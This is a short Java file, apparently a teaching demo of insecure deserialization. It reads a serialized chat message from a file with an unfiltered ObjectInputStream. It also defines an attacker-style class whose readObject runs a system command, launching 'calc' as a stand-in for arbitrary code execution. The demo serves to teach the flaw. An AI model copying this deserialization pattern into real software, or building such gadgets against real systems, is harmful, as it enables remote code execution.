import java.io.*;
import java.util.*;

class ChatMessage implements Serializable {
    String user;
    String content;
    public ChatMessage(String u, String c) {
        user = u;
        content = c;
    }
}

class ChatProcessor {
    ObjectInputStream ois;
    public ChatProcessor(InputStream is) throws IOException {
        ois = new ObjectInputStream(is);
    }
    
    public ChatMessage readMessage() throws IOException, ClassNotFoundException {
        return (ChatMessage) ois.readObject();
    }
}

public class ChatApp {
    public static void main(String[] args) throws Exception {
        if (args.length == 0) return;
        
        // 模拟读取用户数据文件
        FileInputStream fis = new FileInputStream(args[0]);
        ChatProcessor cp = new ChatProcessor(fis);
        
        ChatMessage msg = cp.readMessage();
        System.out.println("[" + msg.user + "]: " + msg.content);
        
        fis.close();
    }
}

// 攻击者构造恶意类
class MaliciousPayload implements Serializable {
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        Runtime.getRuntime().exec("calc"); // 模拟任意命令执行
    }
}